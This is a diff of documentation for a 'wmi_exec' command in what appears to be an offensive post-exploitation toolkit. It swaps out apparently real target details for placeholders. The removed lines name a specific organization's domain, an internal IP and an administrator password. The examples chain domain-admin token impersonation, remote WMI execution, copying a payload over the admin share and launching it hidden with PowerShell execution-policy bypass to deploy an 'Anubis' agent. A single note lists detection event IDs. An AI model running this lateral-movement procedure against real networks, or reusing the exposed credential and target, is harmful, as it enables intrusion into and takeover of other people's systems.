@@ -20,7 +20,7 @@ Executes a command on a **remote Windows host** via WMI `Win32_Process.Create` u
 
 #### target *(required)*
 - Description: IP address or hostname of the remote target.
-- Example: `10.12.193.4` or `PC01.copel.nt`
+- Example: `192.168.1.10` or `PC01.corp.local`
 
 #### command *(required)*
 - Description: Command line to execute on the remote host via `Win32_Process.Create`. Fire-and-forget — redirect stdout to file for output capture.
@@ -40,17 +40,17 @@ Executes a command on a **remote Windows host** via WMI `Win32_Process.Create` u
 # --- Modo 1: token implícito (aplique token_steal antes) ---
 token_steal                          # lista processos com tokens de domínio
 token_steal 1884                     # impersona token de domain admin
-wmi_exec 10.12.193.4 "cmd /c whoami > C:\Windows\Temp\o.txt 2>&1"
-download 10.12.193.4 C:\Windows\Temp\o.txt
+wmi_exec 192.168.1.10 "cmd /c whoami > C:\Windows\Temp\o.txt 2>&1"
+download 192.168.1.10 C:\Windows\Temp\o.txt
 
 # --- Modo 2: credenciais explícitas ---
-wmi_exec 10.12.193.4 "cmd /c net user" COPEL\administrator Senha@123
+wmi_exec 192.168.1.10 "cmd /c net user" CORP\administrator P@ssw0rd
 
 # --- Deploy de agente lateral ---
 # 1. Copia payload via share (com token impersonado)
-shell copy C:\Windows\Temp\a.ps1 \\10.12.193.4\C$\Windows\Temp\a.ps1
+shell copy C:\Windows\Temp\a.ps1 \\192.168.1.10\C$\Windows\Temp\a.ps1
 # 2. Executa via WMI (sem wmic.exe)
-wmi_exec 10.12.193.4 "powershell -ep bypass -WindowStyle Hidden -f C:\Windows\Temp\a.ps1"
+wmi_exec 192.168.1.10 "powershell -ep bypass -WindowStyle Hidden -f C:\Windows\Temp\a.ps1"
 ```
 
 ## Technique Detail
@@ -89,15 +89,15 @@ wmi_exec 10.12.193.4 "powershell -ep bypass -WindowStyle Hidden -f C:\Windows\Te
 - **ReturnValue codes:** 0=Success, 2=Access Denied, 3=Insufficient Privilege, 8=Unknown, 9=Path Not Found, 21=Invalid Parameter.
 - **Detecção (blue team):** Microsoft-Windows-WMI-Activity/Operational Event ID 5857/5858/5859 + Sysmon Event ID 20 (WmiEvent). Logs no host **alvo**, não na origem.
 
-### Lateral Movement Flow (COPEL context)
+### Lateral Movement Flow
 
 ```
-1. token_steal                         → identifica processo de domain admin
-2. token_steal <pid>                   → impersona token
-3. wmi_exec 10.12.193.4 "cmd /c whoami > C:\Temp\o.txt 2>&1"
-4. download 10.12.193.4 C:\Temp\o.txt → confirma execução como domain admin
-5. wmi_exec 10.12.193.4 "powershell -ep bypass -f C:\Temp\a.ps1"
-                                       → deploy Anubis no host lateral
+1. token_steal                          → identifica processo de domain admin
+2. token_steal <pid>                    → impersona token
+3. wmi_exec 192.168.1.10 "cmd /c whoami > C:\Temp\o.txt 2>&1"
+4. download 192.168.1.10 C:\Temp\o.txt → confirma execução como domain admin
+5. wmi_exec 192.168.1.10 "powershell -ep bypass -f C:\Temp\a.ps1"
+                                        → deploy Anubis no host lateral
 ```
 
 ---
